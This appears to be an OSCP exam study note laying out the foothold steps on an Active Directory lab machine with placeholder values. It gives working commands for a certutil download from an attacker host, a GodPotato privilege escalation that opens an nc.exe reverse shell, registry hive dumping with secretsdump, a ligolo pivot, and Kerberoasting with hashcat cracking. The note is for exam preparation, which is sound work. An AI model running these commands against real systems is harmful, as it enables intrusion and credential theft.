# 🎯 MS01 — Exam Solve Guide (Foothold)

> How the **first AD box** actually goes on the OSCP AD set, distilled from real solves. Pattern: you're handed a low‑priv domain credential → land a shell on MS01 → local SYSTEM via token abuse → pivot inward → Kerberoast a service account to move laterally. Every value here is a placeholder — fill from your own run.

Part of [[Active Directory]] · [[AD Attack Framework]]. Next: [[MS02 — Exam Solve Guide (Lateral)|MS02]] → [[DC01 — Exam Solve Guide (Domain)|DC01]]. Overview: [[Exam AD Set — Solve Overview]].

```bash
export IP=<MS01_IP> DOMAIN=<domain.tld> U='<given_user>' P='<given_pass>'
echo "$IP MS01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts ; sudo ntpdate $IP   # clock first
```

## 1. Recon — confirm the surface
```bash
sudo nmap -sC -sV -p- --min-rate 5000 $IP -oN nmap/ms01.txt
```
Typical finds: **22 SSH**, **445 SMB (signing not required)**, **5985/5986 WinRM**, **8000/8080/8443 web/IIS**. The given cred usually logs in over **SSH or WinRM**.

## 2. Access — log in with the provided domain cred
```bash
ssh $U@$IP                                  # OpenSSH-for-Windows is common
evil-winrm -i $IP -u $U -p "$P"             # if 5985/5986 and the user is Remote Mgmt
```
→ `whoami /all` to see groups + privileges.

## 3. PrivEsc — SeImpersonate → SYSTEM (the usual win)
```cmd
whoami /priv        :: look for SeImpersonatePrivilege = Enabled
certutil -urlcache -f http://<KALI>:<port>/GodPotato-NET4.exe GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd.exe"
```
Catch on a listener → **SYSTEM**. ([[Token Privileges & Potato]]) If no SeImpersonate, fall back to [[Windows Privilege Escalation]] (services, AlwaysInstallElevated, stored creds).

## 4. Loot — dump local secrets
```cmd
reg save HKLM\SAM sam.hiv & reg save HKLM\SYSTEM system.hiv & reg save HKLM\SECURITY security.hiv
```
```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```
Reuse any local user's hash/password against the other boxes ([[Credential Reuse]], [[Pass-the-Hash]]). **Also check:** PSReadLine history (`...\PSReadLine\ConsoleHost_history.txt`) and a `C:\windows.old\...\config\SAM` copy — both are recurring cred sources.

## 5. Pivot — reach the internal AD subnet
MS01 bridges the VPN to the internal network where the DC/MS02 live.
```bash
sudo ligolo-proxy -selfcert                 # kali
# on MS01: .\ligolo-agent.exe -connect <KALI>:11601 -ignore-cert   → add ip route to the internal /24
```
([[Ligolo-ng]] · [[Pivoting and Port Forwarding]])

## 6. AD enum + Kerberoast — earn the lateral cred
```bash
bloodhound-python -u $U -p "$P" -d $DOMAIN -ns <DC_IP> -c all --zip
sudo ntpdate <DC_IP>
impacket-GetUserSPNs "$DOMAIN/$U:$P" -dc-ip <DC_IP> -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```
A cracked **service-account** password (e.g. an `MSSQL/...` or `HTTP/...` SPN) is your ticket to MS02. ([[Kerberoasting]] → [[Hash Cracking]])

## ➡️ Handoff
Carry the cracked **service cred** + every local hash to [[MS02 — Exam Solve Guide (Lateral)]].

## 🔑 Exam reminders
- **Clock sync + `/etc/hosts`** before any Kerberos step, or it fails cryptically.
- Given a domain user → **try it on SSH *and* WinRM** first; don't brute.
- `SeImpersonate` is the default foothold-box SYSTEM path — check `whoami /priv` immediately.
- Pivot early: MS02/DC are usually only reachable **through** MS01.
